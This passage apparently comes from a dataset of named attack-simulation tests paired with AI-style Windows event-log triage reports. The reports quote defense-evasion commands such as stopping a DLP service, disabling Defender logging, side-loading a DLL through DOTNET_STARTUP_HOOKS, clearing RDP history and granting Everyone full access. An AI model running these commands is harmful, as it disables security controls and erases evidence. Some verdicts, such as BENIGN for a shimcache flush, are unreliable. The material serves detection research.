2. **Review the Context of `cmd.exe` Usage**: Determine if the script `SyncAppvPublishingServer.vbs` was expected or if it was potentially injected with malicious intent.
3. **Audit Recent Changes and User Actions**: Check for other unusual activities or changes made by the `admin_test` user or other admin accounts around the same timeframe.
4. **Validate Update Processes**: Confirm that the processes related to Microsoft Edge updates were carried out as expected and without anomalies."
Disable Windows Notification Center,"**Analysis of Windows Event Logs:**

Upon review of the provided Windows event logs, I have observed a series of events that may require further attention:

1. **Wevtutil and Conhost Executions**: 
    - The repeated execution of `wevtutil.exe` and `conhost.exe` under the context of `SERVER002\admin_test` is noted. These processes are system utilities where `wevtutil.exe` is used for managing event logs, and `conhost.exe` is the Console Window Host.
    - These actions occur in a tightly clustered timeframe, which could suggest script or batch process execution. While this may be routine, it's worth investigating to ensure it aligns with expected operational tasks, especially given that `admin_test` is an administrative user.

2. **`cmd.exe` with Registry Modification**:
    - The execution of `cmd.exe` using command: 
      ```shell
      cmd.exe /c reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f
      ```
      involves modifying the registry to disable the Notification Center. Modifying system settings via the registry can be a sign of malicious intent, especially if it was done without user approval or knowledge.
    - The origin of the command is traced back to the `wsmprovhost.exe` process, often related to remote management (Windows Remote Management).

3. **Time Changes in System Logs**:
    - There are a few entries indicating a change in system time, as seen with Event IDs 3569, 3570, 3571, 3572, 3573, and related security audit events.
    - These changes can be concerning if not sanctioned or expected, as they might indicate attempts to cover tracks of malicious activities.

4. **Edge Update Process Activity**:
    - Numerous entries related to Microsoft Edge Update processes, which appear consistent with update activities, including service starting and stopping, setup, and registration processes.
    - These processes run under the `NT AUTHORITY\SYSTEM` context, showing legitimate high privilege execution typical for software updates.

**Assessment:**

- **Suspicious Activity**: The batch execution of `wevtutil.exe` and `conhost.exe`, combined with the `cmd.exe` registry modification, appears suspicious and warrants further investigation. This behavior could represent script-based automation or preparatory actions for persistence or system configuration changes by a malicious actor.
  
- **Time Manipulation**: Any unauthorized changes to the system time can have implications for log integrity and should be checked against planned maintenance or known system issues.

- **Edge Activity**: This is consistent with routine update operations, thus considered benign if it aligns with the scheduled update cycles.

**Recommendation**:

To proceed, the following actions should be taken:
- **Review Scheduled Tasks and Scripts**: Verify if `admin_test` initiated the actions through legitimate scripts or scheduled tasks.
- **Investigate `cmd.exe` Execution**: Check the origin and authorisation for the registry modification. Validate with `admin_test` or administrative policies.
- **System Time Change Audit**: Ensure these changes were intentional and cross-reference with NTP server communications or maintenance logs.
- **User Verification**: Confirm `admin_test` actions are legitimate by consulting the user or reviewing policy adherence.

**Resolution**: **SUSPICIOUS**

While some activities seem consistent with regular system tasks, the combination of suspicious command executions and system time changes require careful examination to rule out any potential threats or misconfigurations. Further investigation is required to either affirm benign activity or mitigate potential risks."

Mshta executes VBScript to execute malicious command,"### Detailed Analysis of the Logs:

#### Indicators of Potential Malicious Activity:

1. **PowerShell Script Execution via mshta:**
   - The log entry showing the execution of `cmd.exe` with the command line to run an mshta vbscript that launches a PowerShell script is highly suspicious. This is a known tactic used by attackers for executing scripts without directly launching PowerShell, which can be more easily flagged.
   - The command: `""cmd.exe"" /c mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.005\\src\\powershell.ps1"""":close"")`

2. **Frequent Execution of `wevtutil.exe`:**
   - Multiple instances of `wevtutil.exe` being executed. While the utility is used for managing event logs, frequent and unsanctioned execution could suggest log tampering or clearing attempts by an attacker trying to cover tracks.

3. **Suspicious Activity Described in Sysmon Event ID 1:**
   - Multiple entries where processes like `mshta.exe`, `cmd.exe`, and `powershell.exe` are involved in a sequence leading to the execution of scripts in a Temp folder.
   - These indicators are common in attempts to execute malicious scripts in a stealthy manner.

4. **Unauthorized Privileges and Logins:**
   - The presence of an account (`admin_test`) with elevated privileges and its use in executing potentially malicious commands needs to be reviewed. Its elevated privileges (SeDebugPrivilege, SeBackupPrivilege, etc.) could be abused.

#### Assessment:
The logs reveal a sequence of commands and process executions correlating with known tactics for executing malicious scripts stealthily. The scenario involves a chain from `cmd.exe` to `mshta`, leading to a PowerShell script execution, which is a classic maneuver in fileless malware attacks. 

Additionally, the wevtutil.exe executions without any clear operational intention could suggest an attempt at log tampering. These activities, combined with unauthorized usage of administrative privileges, indicate a potential compromise.

### Resolution:

- **Resolution:** MALICIOUS
  - **Threats/Risks Identified:** The method of executing scripts through mshta followed by a PowerShell script execution is indicative of an attack or unauthorized breach, potentially aiming to execute harmful scripts while evading detection mechanisms. Such patterns are typical of sophisticated attacks trying to bypass traditional defenses.
  
- **Guidance on How to Proceed:**
  - Immediately isolate the affected machine (Server002) from the network to prevent lateral movement.
  - Conduct a thorough forensic analysis of the compromised machine to assess the extent of the intrusion, identify any additional backdoors, and understand the attacker's objectives.
  - Review and reset credentials for the user `admin_test` and any other users with elevated privileges.
  - Investigate any job or task scheduled to run on this machine that might have facilitated the malicious activities.
  - Ensure antivirus and endpoint detection solutions are updated to potentially catch similar malicious executions in the future.
  - Engage with the security incident response team to manage communication and develop a detailed remediation strategy."
Disable Arbitrary Security Windows Service,"Upon reviewing the Windows event logs, the following findings can be outlined:

1. **Process Execution:**
   - The log entries show several executions of standard Windows processes such as `svchost.exe`, `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe`. These processes are typically benign as they are core Windows components or utilities. However, the context of their execution can sometimes indicate malicious usage.

2. **Suspicious Command Execution:**
   - The execution of `cmd.exe` with the command line `\""cmd.exe\"" /c net.exe stop McAfeeDLPAgentService & sc.exe config McAfeeDLPAgentService start= disabled` is highly suspicious. Stopping and disabling security services, specifically related to McAfee Data Loss Prevention (DLP), can be indicative of an attempt to disable security software for malicious purposes.

3. **Privilege Level:**
   - Most processes run under high integrity level, which is often necessary for system-related tasks but can be risky if leveraged by malicious actors to perform unauthorized actions or escalate privileges.

4. **User Account and Anomalous Executions:**
   - The processes were executed by the `SERVER002\\admin_test` user. Given the high level of access this user account appears to have, any misuse could severely impact the system's security posture.
   - The appearance of multiple instances of `wevtutil.exe` and `conhost.exe` under this user could indicate either legitimate administrative activities or the use of these tools for obfuscation in a potential attack.

LockBit Black - Disable the ETW Provider of Windows Defender -Powershell,"### Analysis of the Windows Event Logs

**1. System Log Analysis:**
   - The logs indicate standard Windows Kernel operations and time synchronization activities using svchost.exe and time.windows.com. This svchost activity appears to be tied to regular time-setting operations. 
   - There is a consistent time adjustment noted (`EventID: 1` and `EventID: 24`) across different logs, which is typical when the Windows time needs synchronization. 

**2. Application Log Analysis:**
   - Events from `edgeupdate` indicating stopping and starting of services are benign and common during scheduled updates for Microsoft Edge. These logs do not indicate any unusual or suspicious activities.
   - The Security-SPP (Software Protection Platform Service) event logs software protection activities, typical for ensuring licensing agreements are adhered to. 

**3. Windows PowerShell Log Analysis:**
   - **Suspicious Activity Detected:** The PowerShell logs reveal a script execution attempting to alter the Windows Defender operational channel settings:
     - PowerShell command: `New-ItemProperty ""HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" -Name Enabled -PropertyType DWord -Value 0 -Force`
     - This appears to disable a certain Windows Defender operational channel, likely as an attempt to hinder logging or monitoring, which is a common tactic used by malicious actors to cover tracks.

**4. Sysmon Log Analysis:**
   - Several process creations related to wevtutil, conhost, and whoami are observed. These events suggest:
     - `wevtutil` is used for managing Windows event logs. If not expected, it could indicate an attempt to export or clear logs.
     - `whoami.exe` is a tool used to query the current user context. Its use in an administrative context might indicate reconnaissance to understand current permissions.
     - However, the majority of activity around Microsoft Edge Update appears legitimate, as they align well with system updates and service operations often performed by `NT AUTHORITY\SYSTEM`.

**5. Security Log Analysis:**
   - Time change events validated against system adjustments logged in the System log appear benign and authorized through svchost.exe under a network service account.

### Conclusion

Based on the investigation of the provided log entries, the PowerShell activity stands out as **SUSPICIOUS** for potentially attempting to disable logging for Windows Defender. Other activities noted appear consistent with regular operations, except for this anomalous PowerShell usage which warrants further investigation.

### Recommendation & Resolution

- **Resolution:** **SUSPICIOUS**
- **Guidance:**
  - Conduct a follow-up analysis on the context and origin of the PowerShell commands, and identify if similar activity appears on other systems to determine if part of a larger attack vector.
  - Review access logs and user activities associated with the `admin_test` account or any accounts connected with this PowerShell activity.
  - Ensure Windows Defender settings and configurations are secure and present as expected. 
  - Consider increasing logging and alerts for future PowerShell modifications, particularly related to security endpoint settings."
DLL Side-Loading using the dotnet startup hook environment variable,"### Analysis:

In the provided Windows event logs, there are several process executions and system activities captured. Here is the analysis of the logs:

1. **Microsoft EdgeUpdate Activities**:
   - Numerous instances of `MicrosoftEdgeUpdateComRegisterShell64.exe` and `MicrosoftEdgeUpdate.exe` executions are recorded.
   - These logs indicate the normal functioning of Microsoft Edge's update service. The Edge updater processes are running under `NT AUTHORITY\SYSTEM`, which is typical for service operations.
   - The SHA256 hashes are consistent with legitimate Microsoft binaries.
   - The command lines and file versions do not suggest tampering or unusual activity.

2. **PowerShell and Wevtutil Executions**:
   - There are logs showing the execution of `powershell.exe` by the user `admin_test`. The absence of command-line arguments or suspicious activities from this PowerShell execution means it is not immediately suspect.
   - Multiple `wevtutil.exe` instances are executed by `admin_test`. This could be legitimate if the user was performing event log queries or backups, but repeated instances might require further verification to rule out any attempts to clear or manipulate event logs.

3. **Command Execution from Temp Directory**:
   - A `cmd.exe` instance executes with a command referencing `DOTNET_STARTUP_HOOKS` in a temporary directory. This command is setting an environment variable to load a `.dll` file (`preloader.dll`), typically an indication of code that hooks into existing processes, which is suspicious.
   - The `.dll` file loaded from a temporary directory could imply malicious intent, such as injecting malicious code into legitimate processes.

4. **WhoAmI and HostName Executions**:
   - Both `whoami.exe` and `hostname.exe` executions are recorded. These could be benign utility checks by the user `admin_test`, but could also be part of a reconnaissance script.

### Assessment:

- **Edge Update Activity**: The entries related to the Edge updater appear normal, and the Edge update service's operations aren't typically indicative of malicious activity in this context. 
- **PowerShell and `wevtutil` Usage**: While their execution does not conclusively indicate malicious activities given the current data, the frequency and context of these actions would benefit from further validation, especially if log tampering is suspected.
- **Command Execution in Temp Directory**: This is the most concerning activity. The usage of `DOTNET_STARTUP_HOOKS` with a `.dll` from a temporary file path suggests loading potentially unwanted or harmful code, possibly indicating compromise.
  
### Recommendations:

Given the logs' context, the assessment resolution is **SUSPICIOUS**. This label arises primarily due to the unusual command execution loading a `.dll` from a temporary directory, which warrants further investigation.

1. **Immediate Isolation**: Consider isolating the system to prevent any potential spread if it’s involved in malicious activities.
2. **Deep Dive Analysis**: Conduct an in-depth investigation into the `preloader.dll` and its source. Understand its purpose and why it is being loaded from a temporary directory.
3. **User Verification**: Confirm with the user `admin_test` for any legitimate reasons behind the suspicious command usage.
4. **Monitoring and Alerts**: Set up alerts and monitoring for the appearance of similar command executions or the use of temporary directories for executing sensitive resources.
5. **Review PowerShell and `wevtutil` Execution History**: Assess these logs for any correlations with unusual activities or commands that might have been executed.

The logs' context indicates that while there is no direct evidence of a system compromise, the actions of setting `DOTNET_STARTUP_HOOKS` with custom DLLs in temporary paths are unconventional and potentially dangerous, requiring a more thorough examination."
Malicious process Masquerading as LSM.exe,"After analyzing the provided event logs, several findings and potential indicators of concern were identified:

1. **Security Log Analysis:**
   - The events with `EventID: 5379` indicate credential validation attempts involving the `MicrosoftAccount` and `WindowsLive` services. The `ReturnCode: 3221226021` indicates a failed logon attempt. This can suggest unsuccessful access attempts, which might result from either benign configuration issues or attempted unauthorized access. However, the failure is continuous and recurrent in very close timestamps, which could suggest an automated or scripted attempt to access resources.

2. **System Log Analysis:**
   - Standard updates are seen for Microsoft Defender, which appear normal as part of regular security updates. Events `EventID: 44` and `EventID: 43` do not show any abnormal activity and are likely routine.

3. **Sysmon Log Analysis:**
   - The `Sysmon` logs reveal some unusual entries:
     - A process creation event shows `cmd.exe` being used to copy itself to `C:\lsm.exe` and then executing a command with `lsm.exe`. This is suspicious because `lsm.exe` is typically a Windows service located in the System32 directory, and seeing a different file being created and executed as `lsm.exe` elsewhere could indicate an attempt to masquerade as a legitimate system process.
     - There are multiple instances of `wevtutil.exe` being executed by the user `SERVER002\admin_test`. While `wevtutil` is used for event log management, its usage in quick succession can suggest log clearing or manipulation attempts, often seen in post-exploitation phases.
     - The spawned processes such as `whoami.exe` and `hostname.exe` are common utilities but can indicate reconnaissance activities if initiated in unauthorized contexts.
     - The final concerning event is the use of `cmd.exe` to create and execute commands under `lsm.exe`, which is not typical and suggests potentially malicious script execution.

### Assessment and Guidance:
- **Assessment:** The logs contain activities that indicate potential compromise, particularly around potential masquerading and unauthorized command execution attempts. The combination of credential failure logs, suspicious processes in Sysmon, and the creation of masquerading executables signify possible malicious activity.

- **Guidance:** Immediate steps should be to isolate the machine for detailed forensics, inspecting for other signs of compromise such as suspicious network traffic or unauthorized file changes. Review each user's recent activity, especially the `SERVER002\admin_test` account. It's critical to perform a full malware scan and consider refreshing credentials and enhancing monitoring on the involved accounts and systems.

### Resolution:
Based on the analysis and observed log activities, the situation is assessed as **MALICIOUS**. Further investigation and remediation actions should be taken to ensure the security and integrity of the involved systems."
Flush Shimcache,"After thoroughly analyzing the provided logs, the following observations and assessments have been made:

1. **Security Log**:
   - There are two Event ID 4616 logs related to the system time being changed by the LOCAL SERVICE account using svchost.exe. Time changes can be legitimate administrative actions or system operations; however, frequent or unaccounted changes may be cause for suspicion if associated with malfeasance. Given the context of operating as LOCAL SERVICE, this is likely benign unless part of a broader suspicious pattern.

2. **Sysmon Log**:
   - A series of process creations and terminations are primarily linked to the **Microsoft Edge Update** process. The processes initiated by `MicrosoftEdgeUpdate.exe` include normal software update operations, suggesting standard behavior for an automated update process working with system privilege under NT AUTHORITY\SYSTEM, indicative of routine system maintenance.
   - The command `""cmd.exe"" /c Rundll32.exe apphelp.dll,ShimFlushCache` is often associated with managing system cache (Shim) and by itself isn't explicitly indicative of malicious activity. However, the context is key, and isolated command execution without user action should always be reviewed.
   - System utilities like `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `conhost.exe` being executed by `admin_test` could be part of legitimate administrative tasks or testing buttressed if combined by other signs of duplicitous behavior.

3. **System Log**:
   - Displays records of system time adjustments managed by svchost.exe, in conjunction with time service synchronization with an NTP server (`time.windows.com`). This can be considered normal for time synchronization purposes.

4. **Application Log**:
   - Reflects services related to the `edgeupdate` provider stopping actions, which correlate with software updates that typically occur after service executions complete their tasks.

## Assessment:
Upon evaluating these logs, there's a clear indication of standard system actions correlated strongly with system maintenance tasks like time synchronization and application updates. No clear signs, such as unauthorized privilege escalations, suspicious command lines, or unknown processes typically associated with compromise, are detected.

## Resolution:
- **BENIGN**: The log entries appear to depict regular system operations, mainly related to Microsoft Edge updates and time synchronization processes. There are no outright indicators of malicious activity, such as unexpected process start or foreign and suspicious command executions.
  
It's advised to maintain standard vigilance, monitor ongoing system activity, and investigate any new alerts in conjunction with these logs for comprehensive further assurance."
Terminal Server Client Connection History Cleared,"Upon analyzing the provided Windows event logs, the following activities have been identified, which may be considered worthy of further investigation:

1. **Sysmon Logs Highlighting Command Execution:**
   - There's evidence of `whoami.exe` and `hostname.exe` being run under the user `SERVER002\\admin_test` at a high integrity level. Tools like `whoami` and `hostname` are often used during reconnaissance to gather information on the current user and machine identity, respectively.
   - More significantly, there is the execution of `cmd.exe` with a command line that deletes registry keys related to the Remote Desktop Client configuration:
     ```
     ""cmd.exe"" /c reg delete ""HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default"" /va /f & reg delete ""HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers"" /f
     ```
   - These registry keys are associated with RDP (Remote Desktop Protocol) connections, and their deletion could imply attempts to remove evidence of RDP sessions, indicating potential malicious behavior.

2. **PowerShell Usage:**
   - There is an execution of `powershell.exe` under the same administrative user, but without accompanying command line details in the logs. PowerShell is a powerful administration and scripting tool that can be leveraged for both legitimate and malicious activities. The lack of detailed command line arguments makes this event somewhat concerning without further context.

3. **Wevtutil and Other Windows Service Executions:**
   - `wevtutil.exe` running under an administrative account could have implications for event log management, potentially indicating an attempt to modify or clear event logs.
   - The existence of numerous `conhost.exe` processes is typically expected, given that it supports console applications (e.g., `cmd.exe`, `PowerShell`). However, the large number of instances may indicate something more nuanced, warranting further inspection to verify if they initialize as a part of legitimate activities.

4. **Edge Update Activities:**
   - Frequent execution of various processes related to Microsoft Edge updates (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`) under the `NT AUTHORITY\SYSTEM` user. While this might be routine, the volume of actions concentrated in a short timeframe should be double-checked against expected behaviors for Edge updates to rule out any misuse of these processes for lateral movements or privilege escalations.

### Assessment and Resolution:

While the evidence presented showcases potentially suspicious behavior (notably the registry deletions and extensive PowerShell usage without explicit details), there isn't a definitive indicator of known malicious tools or artifacts. Given the command-line executions observed and the need to triage the exact command invoked through PowerShell, the situation requires more investigation to either confirm or rule out a compromise.

**Resolution: SUSPICIOUS**

### Recommended Next Steps:
1. **Further Investigation:**
   - Examine detailed command invocation in PowerShell by extending the logging or obtaining more contextual data from existing logs.
   - Check for any additional logs tied to RDP session activities or anomaly in user login sessions to substantiate registry deletion actions.
   
2. **Increase Logging:**
   - Activate deeper process creation and command line logging within Sysmon, if not already, to capture more granular details on command-line executions, especially for PowerShell.
   
3. **Network and Threat Hunting:**
   - Perform an audit on network activities around the timeframe to determine if there's abnormal traffic or further attempts at lateral movement correlating with these processes.
   
4. **Endpoint Task Strengthening:**
   - Investigate if these activities align with expected administrative logs and implementation standards, ensuring that anomalies are investigated promptly using EDR solutions.
   
Decisive action toward containment and analysis would help ascertain whether these activities pose a legitimate threat and raise the security posture through additional checks and balances."
Running DLL with .init extension and function,"### Analysis of Logs

The logs provided for analysis span multiple system components, indicating potential signs of suspicious or malicious activity. Here's a breakdown of the identified activities:

#### PowerShell Logs

1. **PowerShell Execution via Rundll32.exe**:
   - The logs show a PowerShell session being initialized with the host application `rundll32.exe`.
   - **Path**: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin\_WT.init,krnl` is suspicious:
     - **Usage of Rundll32**: Often used benignly, but can indicate malicious activity when executing DLLs from unusual or temporary paths.
     - **Command-line Arguments**: Lack of visible command-line arguments in the log is unusual for standard applications, this could imply obfuscation.

#### Sysmon Logs

1. **Process Execution Patterns**:
   - The execution of `rundll32.exe` from a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin\_WT.init,krnl`) is highly suspicious.

2. **Command Line Activity**:
   - **CMD.exe**: Shows execution with potentially obfuscated or encoded commands involving `rundll32.exe`.
   - **Whoami and Hostname Commands**: Executed to gather information about the local system and user.

3. **Process Creation and Parent Process Relationship**:
   - The script started from `wsmprovhost.exe`, which typically operates for legitimate administrative tasks. However, the parent process chain (wsmprovhost.exe -> cmd.exe -> rundll32.exe) is abnormal for a standard operation.

4. **User Context**:
   - Most processes executed in the context of `SERVER002\admin_test`, someone with elevated privileges, increasing risk if compromised.

5. **Integrity Level**:
   - High-level integrity of processes indicates potential for executing privileged actions.

#### Application and Security Logs

1. **Software Protection Platform Service (SPP)**:
   - A benign log event for the activation or deactivation of software, not directly linked to the suspicious activity. 

2. **Absence of Critical Security Logs**:
   - The lack of security log events makes it difficult to confirm or deny unauthorized access attempts, privilege escalations, or other security breaches.

### Assessment

The behavior outlined above suggests possible malicious activity. Particularly, the use of `rundll32.exe` to execute a DLL file from an unusual path in a temporary directory on a critical host machine is a known technique for executing malicious payloads. This technique is consistent with tactics used by advanced persistent threats (APTs) or malware to evade detection and execute unwanted actions under the guise of legitimate system processes.

### Recommended Actions

1. **Immediate Investigation**:
   - Confirm whether the file `_WT.init,krnl` is legitimate or if it's been maliciously placed.
   - Inspect the contents of `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin` for any other suspicious files or scripts.

2. **Monitor and Isolate**:
   - Continue monitoring for further abnormal process execution or new file creation related to this activity.
   - Consider isolating `Server002` to prevent potential spread if a compromise is confirmed.

3. **User Access Audit**:
   - Validate recent changes in access permissions or roles for `admin_test`.
   - Educate users about recognizing signs of social engineering attacks which may have led to unauthorized execution.

4. **System and Network Inventory**:
   - Ensure EDR systems are adequately configured to capture process creations, command-line details, and network connections for in-depth investigations.

5. **Threat Intelligence**:
   - Cross-reference observed IoCs (Indicators of Compromise) such as hashes or process paths with known threat intelligence.

### Resolution

Given the findings, the logs indicate **SUSPICIOUS** activity due to anomalies and potential misuses of system processes, which warrant further investigation to confirm any ongoing threat or compromise."
Execution from Compressed JScript File,"To assess the indicators of potential malicious activity within the provided logs, I will analyze distinct segments such as the System, Sysmon, Application, and Security logs. Below is the detailed analysis:

### System Log
- The system logs show normal updates related to the Security Intelligence Update for Microsoft Defender Antivirus. It indicates the system is actively receiving security updates which is expected and not suspicious.

### Sysmon Log
- **PowerShell Execution**: An event shows PowerShell executed by `SERVER002\admin_test`. PowerShell is often used in legitimate administrative tasks, but without additional context such as command arguments, this event alone warrants further investigation to ensure no malicious scripts were executed.
- **Frequent Use of Wevtutil.exe**: The `wevtutil.exe` process appears multiple times, which is used to query and manage event logs. It's not inherently malicious but should be investigated further in case it's used to clear or tamper logs.
- **Execution from TEMP Directory**: Notably, there is an execution of `cmd.exe` executing a script from a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\temp_datajs.zip\\datajs.js`. This is highly suspicious as scripts run from temporary directories can often indicate malicious attempts to execute a payload or exploit.
- **Wscript Execution**: Tied to the execution of `wscript.exe` which is used to run scripts, and in this case, a suspicious JavaScript file. This is indicative of a potential malware attempt hiding in obfuscated scripts.
- **Launching of Calculator (calc.exe)**: This could be benign if launched under legitimate circumstances. However, if tied to a script run from a suspicious path, it could signal an anomaly or test to see if a payload execution works.

### Application Log
- Shows Windows Defender is actively on, which generally provides a layer of protection but doesn't rule out that an attack was attempted or occurred prior to this log entry.

### Security Log
- Series of Event ID 5379 entries related to Windows credential access auditing. The failed credentials and numerous log entries could suggest attempts to access or enumerate user accounts - possibly indicative of credential stuffing, brute force attempts, or lateral movement reconnaissance.

### Overall Assessment and Recommendations
- **Malicious Indicators**: The command execution of JavaScript from the TEMP directory and subsequent wscript activity are strong indicators of potential compromise. The TEMP directory is a common source of malicious script execution and should be flagged for further detailed review.
- **Resolution**: Due to the suspicious script execution patterns and usage of wscript.exe from the temporary path, this analysis resolution leans towards **MALICIOUS**.
- **Guidance**:
  - Immediately isolate the affected machine from the network to prevent any further compromise or propagation.
  - Conduct a detailed threat hunt on the system focusing on registry changes, disk and file activity to identify and remove any potential malware.
  - Review any telemetry data to identify any outbound connections to suspicious domains that correlate with the timeline of EVTX entries.
  - Ensure security patches are up to date and consider running a full antivirus scan to remove any detected threats.
  - Verify user account activities for any signs of unauthorized access or role misuse, especially `admin_test`.
  - Conduct a post-incident analysis for root cause determination and bolster security training, especially around scripting and its potential abuse vectors."
Office 365 - Exchange Audit Log Disabled,"After reviewing the provided Windows event logs, I've identified several areas that suggest potential security concerns.

### Analysis:

1. **PowerShell Activity:**
   - The PowerShell commands observed involve the use of `ConvertTo-SecureString` and `New-Object System.Management.Automation.PSCredential` to create a credential object with an empty or null password. This is followed by a connection attempt to Exchange Online and a modification of audit log configuration using `Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False`. The disabling of audit log ingestion is suspicious as it can be an attempt to hide activity from being logged.

2. **Process Execution:**
   - Multiple instances of `Windows PowerShell` and `wevtutil.exe` (a tool used for managing event logs) are recorded in Sysmon logs. The use of PowerShell and wevtutil in a short time frame combined with the credentials and audit log change behavior is unusual.

3. **Security Incidents:**
   - The security log shows events (ID 4798) involving `C:\Windows\System32\CompatTelRunner.exe` querying user names. While CompatTelRunner.exe is primarily related to telemetry, its querying of user names is atypical if seen in conjunction with the aforementioned PowerShell behavior.
   - An administrative privilege escalation event (ID 4672) has been logged revealing a user acquiring significant privileges which could potentially be harmful if misused.

### Threats and Risks Identified:

- Attempting to connect or modify Exchange Online settings using invalid credentials can be seen as an unauthorized access attempt. The empty password used to build the credential object could suggest an unauthorized or experimental access method.
- Disabling audit log ingestion is directly indicative of an attempt to suppress activity monitoring.
- The querying of user names and high-frequency process creation in conjunction with high-level privilege events could point to initial reconnaissance or environment exploration activity.

### Guidance and Resolution:

- **Immediate Action:**
  - Investigate why the `Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False` command was executed and determine if any unauthorized changes in the Exchange configuration were made.
  - Assess the context in which CompatTelRunner.exe is running. This typically legitimate process should be evaluated for any anomalous behavior on the host.
  - Review user activity and policy configurations surrounding the account linked to these operations to ensure no further abuses are in action.

- **Further Investigation:**
  - Review the network logs or any outbound connections during that timeframe to see if any unusual remote connections were established.
  - Verify whether PowerShell execution policies and script restrictions are properly configured and enforced on the network.

- **Resolution**: **MALICIOUS**  
   The logs contain clear evidence of suspicious activity, including attempts to modify critical logging settings and unusual credential usage, suggesting potentially malicious behavior. This requires immediate response and mitigation actions to prevent further unauthorized actions."
Event Log Manipulations- Time slipping via Powershell,"After analyzing the provided Windows event logs, here are the observations:

### Summary of Findings:

1. **Time Manipulation:**
   - A series of events indicate that the system time was changed using PowerShell. Specifically, the command `powershell.exe & {try{ Set-Date -Date (Get-Date).AddDays(3)}...}` was executed. This is a significant indicator of suspicious activity as it suggests an attempt to manipulate system time, potentially to evade detection or compromise system processes that rely on time-based mechanisms.

2. **Usage of System Utilities and Elevated Privileges:**
   - There are multiple instances of system utilities such as `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `wsmprovhost.exe` being executed frequently within a short span of time by the user `admin_test` with high integrity levels. While these utilities are standard system tools, such frequent execution in rapid succession, especially by an administrative account, may indicate scripting or automation often seen in malicious activities.

3. **Microsoft Edge Update Executions:**
   - Numerous instances of Microsoft Edge Update-related processes (`MicrosoftEdgeUpdate.exe`) are seen, which could be benign if directly related to legitimate software updates. However, the repetition and volume should be scrutinized to ensure this isn't being leveraged for malicious purposes, like delivering unwanted payloads or persistent access.

4. **Suspicious System and Security Logs:**
   - Multiple `EventID 4616` logs in the Security log indicate the system time was adjusted multiple times, correlating with the suspicious PowerShell activity.
   - Continuous attempts seen in Security logs with `EventID 5379` suggest someone is attempting to continually access or validate credentials related to a Microsoft account. This could be an indicator of attempts to leverage cloud services or accounts.

5. **Use of PowerShell:**
   - The PowerShell logs show that a script was started and stopped around the same time as the suspicious time-setting activity. This strengthens the suspicious nature of using PowerShell for potentially malicious purposes.

### Assessment:

Based on the details above, particularly the suspicious manipulation of system time using PowerShell and the frequent execution of system utilities under high integrity by an administrative account, it suggests potential malicious activity. Time manipulation is not a typical action for legitimate administrative purposes unless explicitly documented and justified, making this assessment lean towards potential compromise.

### Final Resolution:

- **Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Investigate the current status of the system to assess any ongoing threats or compromised software.
   - Check if the manipulated system time aligns with any scheduled critical applications or logs that could have been neglected due to time change.

2. **Forensic Analysis:**
   - Perform a thorough forensic investigation to understand the extent of the compromise.
   - Analyze related logs preceding and following the suspicious activity window to uncover potential initial access vectors or lateral movements.

3. **Containment and Remediation:**
   - Isolate the affected system to prevent further malicious activity.
   - Consider reverting any unauthorized changes, including correcting the manipulated system time settings.

4. **Security Improvements:**
   - Enhance monitoring and alerting on sensitive actions such as time changes and frequent execution of admin-level processes.
   - Review and harden user account privileges to prevent administrative accounts from being abused.

5. **User Education and Training:**
   - Provide training sessions for users, especially those with administrative privileges, on recognizing and preventing suspicious activities. 

Given the nature and confidence in the malicious intent identified from these logs, immediate attention and robust response strategies are essential to mitigate further risk."
Grant Full Access to folder for Everyone - Ryuk Ransomware Style,"### Detailed Analysis

#### Indicators from Log Review

1. **Use of System Utilities:**
   - **wevtutil.exe**: Frequently initiated by the user `SERVER002\admin_test`. This utility is typically used for managing event logs, which can be benign. However, if invoked unexpectedly or without definite intent, it might suggest attempts to cover tracks by modifying or clearing logs.
   - **icacls.exe:** Running `icacls` with the command-line `""/grant Everyone:F /T /C /Q""` is highly concerning. This command grants full access to Everyone on the targeted directory and all its subdirectories and files. Such permissions changes, especially recursive with silent confirmations, are typically seen in malicious activities trying to ensure complete control or disrupt existing security controls.

2. **Command Prompt Activity:**
   - **cmd.exe** was run with privilege granting `icacls`, which typical of privilege escalation tactics or preparation for lateral movement.

3. **User Activity:**
   - Multiple system management tools (like `hostname.exe`, `whoami.exe`) were run under `admin_test`. While tools like `whoami.exe` are used to identify user accounts, used within a tightly packed timeframe, could indicate an attempt to explore or leverage user credentials.

4. **Network Activity:**
   - **Time Adjustment:**
     - The system clock was adjusted multiple times (`EventID: 4616`) within a short time frame (`svchost.exe` was responsible). Although this might relate to normal NTP synchronizations, frequent time adjustments can be suspicious in a security context to bypass detection mechanisms reliant on timestamps.

5. **Edge Update Executable Activity:**
   - The Microsoft Edge Update executables follow expected periodic updates but also are inappropriate from a Temp directory (`EU7E5D.tmp`). This could indicate either legitimate update activity or might imply misuse of Microsoft applications for unintended purposes.

#### Assessment

Based on the provided logs:

- The use of `icacls.exe` granting permissions to Everyone and the frequent invocation of security-relevant commands (`wevtutil`, `cmd.exe`, `icacls.exe`) stand as primary red flags. Such command-line activity coupled with unusual directory, permission changes strongly suggests the potential for malicious activity beyond standard administrative tasks.

#### Conclusion

- **Resolution**: **MALICIOUS**

### Guidance

**Immediate Actions to Proceed:**

1. **Containment**: 
   - Isolate the compromised system (Server002) from the network to prevent further unauthorized access or spreading.
   
2. **Investigation and Response**:
   - Confirm whether the configurations/permissions on directories have been altered beyond typical standards. 
